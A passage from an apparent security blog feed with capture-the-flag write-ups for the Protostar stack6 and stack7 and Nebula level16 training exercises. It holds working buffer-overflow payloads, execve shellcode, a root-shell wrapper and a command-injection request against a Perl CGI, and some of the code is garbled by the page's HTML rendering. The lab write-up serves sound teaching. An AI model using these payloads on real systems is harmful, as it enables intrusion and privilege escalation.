<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
</span><span class='line'>input path please:
</span><span class='line'>got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
</span><span class='line'>id
</span><span class='line'>uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<p>Without <code>setreuid()</code> call we have only <code>euid=0</code>, so we prepare this shell wrapper:
<figure class='code'><figcaption><span>escalate.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>        <span class="n">execv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo;*80 + [0xb7ecffb0].pack(&ldquo;V&rdquo;) + &ldquo;FAKE&rdquo; + [0xbfffff54].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack6
</span><span class='line'>input path please:
</span><span class='line'>got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAA???FAKET???
</span><span class='line'>id
</span><span class='line'>uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
</span><span class='line'>/tmp/escalate
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack7</h2>

<p><figure class='code'><figcaption><span>stack7.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">char</span> <span class="o">*</span><span class="n">getpath</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">input</span> <span class="n">path</span> <span class="nl">please</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">bzzzt</span> <span class="p">(</span><span class="o">%</span><span class="n">p</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">got</span> <span class="n">path</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="nf">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">getpath</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/stack7
</span><span class='line'>Really redefine built-in command &ldquo;frame&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;thread&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Really redefine built-in command &ldquo;start&rdquo;? (y or n) [answered Y; input not from terminal]
</span><span class='line'>Reading symbols from /opt/protostar/bin/stack7&hellip;done.
</span><span class='line'>gdb> r
</span><span class='line'>input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
</span><span class='line'>got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:0804A008 ebx:B7FD7FF4  ecx:00000000  edx:00000001     eflags:00210202
</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF750  ebp:63413563     eip:37634136
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s z a p c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF750]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF780 : 01 00 00 00  C0 F7 FF BF - 26 06 FF B7  B0 FA FF B7 &hellip;&hellip;..&amp;&hellip;&hellip;.
</span><span class='line'>BFFFF770 : 38 41 64 39  00 FF FF FF - F4 EF FF B7  BC 82 04 08 8Ad9&hellip;&hellip;&hellip;&hellip;
</span><span class='line'>BFFFF760 : 64 33 41 64  34 41 64 35 - 41 64 36 41  64 37 41 64 d3Ad4Ad5Ad6Ad7Ad
</span><span class='line'>BFFFF750 : 41 63 38 41  63 39 41 64 - 30 41 64 31  41 64 32 41 Ac8Ac9Ad0Ad1Ad2A
</span><span class='line'>[007B:0804A008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>0804A008 : 41 61 30 41  61 31 41 61 - 32 41 61 33  41 61 34 41 Aa0Aa1Aa2Aa3Aa4A
</span><span class='line'>0804A018 : 61 35 41 61  36 41 61 37 - 41 61 38 41  61 39 41 62 a5Aa6Aa7Aa8Aa9Ab
</span><span class='line'>[0073:37634136]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
</span><span class='line'>0x37634136: Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x37634136
</span><span class='line'>0x37634136 in ?? ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> i r
</span><span class='line'>eax            0x804a008    0x804a008
</span><span class='line'>ecx            0x0  0x0
</span><span class='line'>edx            0x1  0x1
</span><span class='line'>ebx            0xb7fd7ff4   0xb7fd7ff4
</span><span class='line'>esp            0xbffff750   0xbffff750
</span><span class='line'>ebp            0x63413563   0x63413563
</span><span class='line'>esi            0x0  0x0
</span><span class='line'>edi            0x0  0x0
</span><span class='line'>eip            0x37634136   0x37634136
</span><span class='line'>eflags         0x210202 [ IF RF ID ]
</span><span class='line'>cs             0x73 0x73
</span><span class='line'>ss             0x7b 0x7b
</span><span class='line'>ds             0x7b 0x7b
</span><span class='line'>es             0x7b 0x7b
</span><span class='line'>fs             0x0  0x0
</span><span class='line'>gs             0x33 0x33
</span><span class='line'>gdb> x /s $eax
</span><span class='line'>0x804a008:   &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>The offset for return address is again 80 (0x37634136 in <code>pattern_offset</code>) and
<code>EAX</code> with stored <code>0x804a008</code> value points to the beginning of our buffer,
where we still can jump.</p>

<p>This is because <code>strdup()</code> allocates memory on heap and returns this address:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 3 strdup&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  The strdup() function returns a pointer to a new string which is a duplicate
</span><span class='line'>  of the string s.  Memory for the new string  is obtained with malloc(3), and
</span><span class='line'>  can be freed with free(3).</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x0804a008].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
</span><span class='line'>input path please:
</span><span class='line'>got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
</span><span class='line'>                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX?
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<p>Instead of pointing to the allocated buffer address, it is more portable to
find <code>call eax</code> instruction addresses in code and use one of them.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -M intel -D /opt/protostar/bin/stack7 | grep &lsquo;call.*eax$&rsquo;
</span><span class='line'> 80484bf:   ff d0                   call   eax
</span><span class='line'> 80485eb:   ff d0                   call   eax</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x080484bf].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
</span><span class='line'>input path please:
</span><span class='line'>got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
</span><span class='line'>                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXX?XXXXXXXXXXXX??
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (16-19)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19/"/>
    <updated>2015-06-20T11:51:41+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level16</h2>

<p>There is a perl script running on port 1616, source:</p>

<p><figure class='code'><figcaption><span>index.pl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/env perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Content</span><span class="o">-</span><span class="n">type:</span> <span class="n">text</span><span class="sr">/html\n\n&amp;rdquo;;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$</span><span class="err">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$password</span> <span class="o">=</span> <span class="vg">$&lt;</span><span class="sr">/em&gt;[1];&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="nv">@output</span> <span class="o">=</span> <span class="sr">&lt;code&gt;</span><span class="n">egrep</span> <span class="s">&quot;^$username&quot;</span> <span class="sr">/home/</span><span class="n">flag16</span><span class="sr">/userdb.txt 2&amp;gt;&amp;amp;1&lt;/co</span><span class="n">de</span><span class="o">&gt;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;pre&gt;&lt;code&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="sr">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="p">}</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="sr">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span><span class="n">Login</span> <span class="n">resuls</span><span class="sr">&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Your</span> <span class="n">login</span> <span class="n">was</span> <span class="n">accepted</span><span class="sr">&lt;br/&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Your</span> <span class="n">login</span> <span class="n">failed</span><span class="sr">&lt;br/&gt;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>  <span class="sr">&lt;br/&gt;</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Would</span> <span class="n">you</span> <span class="n">like</span> <span class="n">a</span> <span class="n">cookie</span><span class="p">?</span><span class="sr">&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;</span><span class="o">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span><span class="sr">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="n">htmlz</span><span class="p">(</span><span class="n">login</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">username</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;),</span> <span class="n">param</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)));</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The service is running with flag16 privileges:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ps auxww | grep [f]lag16
</span><span class='line'>flag16    1314  0.0  0.3   2592   836 ?        Ss   Jun18   0:01 /usr/sbin/thttpd -C /home/flag16/thttpd.conf</span></code></pre></td></tr></table></div></figure></p>

<p>Clearly, there is RCE vulnerability (line 14), we can check it creating an arbitrary file:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ wget -q -O /dev/null &ldquo;&lt;a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24&lt;/a>(>abcd)&amp;password=x&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ls -l /home/flag16/ABCD
</span><span class='line'>-rw-rw-r&ndash; 1 flag16 flag16 0 2015-06-21 00:16 /home/flag16/ABCD</span></code></pre></td></tr></table></div></figure></p>

<p>Only problem is that input is uppercased and everything after whitespace character is stripped:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
